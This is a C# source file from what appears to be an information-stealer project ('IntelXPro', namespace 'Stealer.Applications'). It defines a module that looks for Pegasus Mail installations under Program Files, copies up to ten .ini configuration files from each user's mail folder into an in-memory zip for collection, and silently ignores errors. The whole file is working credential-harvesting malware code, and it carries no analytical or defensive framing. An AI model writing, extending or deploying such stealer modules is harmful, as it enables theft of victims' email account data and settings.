using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class PegasusMail : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "PMAIL");
            string programFilesX86Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "PMAIL");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "PegasusMail";

            bool foundData = false;

            if (Directory.Exists(programFilesPath))
            {
                foundData |= CollectFromDirectory(programFilesPath, "ProgramFiles", zip, counterApplications);
            }

            if (Directory.Exists(programFilesX86Path))
            {
                foundData |= CollectFromDirectory(programFilesX86Path, "ProgramFilesX86", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string mailPath = Path.Combine(basePath, "MAIL");
                if (Directory.Exists(mailPath))
                {
                    string[] userDirs = Directory.GetDirectories(mailPath, "*", SearchOption.TopDirectoryOnly);

                    foreach (string userDir in userDirs)
                    {
                        string userName = Path.GetFileName(userDir);

                        string[] iniFiles = Directory.GetFiles(userDir, "*.ini", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in iniFiles.Take(10))
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\PegasusMail\\{location}\\{userName}\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
